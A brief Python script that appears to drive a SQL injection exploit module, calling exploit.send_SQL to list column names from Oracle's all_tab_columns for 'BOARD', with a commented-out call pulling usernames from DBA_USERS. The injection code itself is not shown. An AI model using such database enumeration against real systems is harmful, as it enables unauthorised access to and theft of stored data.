import exploit


if __name__ == "__main__":
    # exploit.send_SQL("USERNAME", "DBA_USERS")

    data = exploit.send_SQL("column_name", "all_tab_columns", "BOARD")

    print(data)
